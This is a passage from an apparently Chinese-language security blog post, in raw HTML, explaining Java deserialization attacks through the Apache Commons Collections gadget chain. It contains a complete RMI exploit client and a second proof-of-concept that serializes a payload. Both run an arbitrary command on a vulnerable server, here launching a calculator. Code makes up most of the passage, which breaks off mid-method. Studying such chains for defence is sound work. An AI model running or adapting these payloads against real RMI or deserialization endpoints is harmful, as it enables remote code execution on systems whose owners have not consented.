class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIexploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 远程 RMI Server 的地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="comment">// 要执行的命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ANN_INV_HANDLER_CLASS</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造 transformers</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line">        <span class="comment">// 构造 chainedtransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TiedMapEntry 类中调用 Map 类的 get 方法</span></span><br><span class="line">        <span class="comment">// LazyMap 的 get 方法调用 transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BadAttributeValueExpException 重写 readObject 方法，调用输入流的 toString 方法</span></span><br><span class="line">        <span class="comment">// TiremapEntry 的 getValue 方法调用 LazyMap 的 get 方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置 TiedMapEntry</span></span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(badAttributeValueExpException, entry);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 BadAttributeValueExpException 对象封装在 Map 中</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        map.put(name, badAttributeValueExpException);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获得 AnnotationInvocationHandler 的构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cl.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 Map 封装到 AnnotationInvocationHandler 中，转换为 Remote 类型</span></span><br><span class="line">        <span class="comment">// 实例化一个代理</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">hl</span> <span class="operator">=</span> (InvocationHandler)cl.newInstance(Override.class, map);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, hl);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(object);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(ip, port);</span><br><span class="line">        registry.bind(name, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><img src="https://i.loli.net/2021/09/16/18OfJbtvEo64U3F.jpg" ><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><blockquote><p>利用 ChainedTransformer 构造恶意代码执行链，反序列化时触发其 transform 方法通过反射调用构造好的恶意代码<br>TransformedMap 修改 key 就会触发调用相应的 transformer.transform<br>动态代理 AnnotationInvocationHandler 在反序列化时对其变量进行设置操作<br>ChainedTransformer 和 AnnotationInvocationHandler 可作为其他 gadget 的“后半”部分</p></blockquote><p>反射机制：在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。</p><p>漏洞成因：InvokerTransformer 类实现的 Transformer 接口，可以通过 Java 反射机制来调用任意函数。</p><p>远程代码执行：Client 构造恶意序列化对象，Server 反序列化触发 <code>readObject</code> 方法，触发构造好的 Transformer 序列，实现代码执行。</p><img src="https://i.loli.net/2021/09/16/43poxMzsqw78rDm.png" ><p>Map 类是存储键值对的数据结构，Apache Commons Collections中实现了类 TransformedMap，用来对 Map 进行某种变换，只要调用 <code>decorate()</code> 函数，传入 key 和 value 的变换函数 Transformer，即可从任意 Map 对象生成相应的 TransformedMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>(map);</span><br><span class="line"><span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line"><span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer 是一个接口，其中定义的 <code>transform()</code> 函数用来将一个对象转换成另一个对象。当 Map 中的任意项的 key 或者 value 被修改，相应的 Transformer 就会被调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Apache Commons Collections 中已经实现了一些常见的 Transformer，其中的 InvokerTransformer 可以通过调用 Java 的反射机制来调用任意函数：</p><ul><li>可控参数 <code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName; <span class="comment">// 方法名称</span></span><br><span class="line">        iParamTypes = paramTypes; <span class="comment">// 参数类型</span></span><br><span class="line">        iArgs = args;  <span class="comment">// 参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer 的 <code>transform()</code> 方法，返回 iConstant 属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ChainedTransformer 接受 Transformer 数组，<code>transform</code> 方法循环调用 Transformer 的 transform 方法，并使用前一个 object 作为参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞利用需要触发 ChainedTransformer 对象的 <code>transform()</code> 函数，而 TransformedMap 的 <code>checkSetValue</code> 函数中就调用了 <code>transform</code> 方法，那么就要通过构造一个 Map 和一个能执行代码的 ChainedTransformer 以此生成 TransformedMap，然后修改 Map 触发 Transformer 调用。</p><p>TransformedMap 中有三个方法调用了 <code>transform()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>动态代理（Dynamic Proxy） AnnotationInvocationHandler 类的 <code>memberValues</code> 是 Map 类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler 的 <code>readObject</code> 函数对 <code>memberValues</code> 的每一项调用 <code>setValue</code> 函数，而该函数会触发 TransformedMap 的 <code>checkSetValue</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 触发 Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化对象触发代码执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; 代码执行</span><br></pre></td></tr></table></figure><p>POC 示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 构造 ChainedTransformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;open /Applications/Calculator.app&quot;</span> &#125;) &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 Map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造 TransformedMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(innermap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 通过反射获得 AnnotationInvocationHandler 类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获得 cls 的构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置 Accessible 为 true</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//通过 newInstance() 方法实例化对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(), <span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">GeneratePayload</span><span class="params">(Object instance, String file)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 将构造好的 payload 序列化后写入文件中</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    